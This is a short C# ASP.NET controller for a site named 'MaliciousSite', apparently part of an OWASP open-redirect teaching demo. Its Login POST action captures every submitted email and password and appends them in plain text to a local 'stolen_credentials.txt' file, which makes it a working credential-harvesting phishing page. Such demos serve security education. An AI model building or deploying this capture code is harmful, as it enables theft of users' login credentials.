using System;
using Microsoft.AspNetCore.Authorization;
using Microsoft.AspNetCore.Mvc;
using MaliciousSite.Models.AccountViewModels;

namespace MaliciousSite.Controllers
{
    [Authorize]
    [Route("[controller]/[action]")]
    public class AccountController : Controller
    {
        [HttpGet]
        [AllowAnonymous]
        public IActionResult Login(string returnUrl = null)
        {
            return View();
        }

        [HttpPost]
        [AllowAnonymous]
        [ValidateAntiForgeryToken]
        public IActionResult Login(LoginViewModel model, string returnUrl = null)
        {
            //OWASP #10 Open Redirects
            System.IO.File.AppendAllText(@"C:\temp\maliciousdata\stolen_credentials.txt",
                DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss") + " | " + model.Email + " | " + model.Password +
                Environment.NewLine);
            return View(model);
        }


    }
}
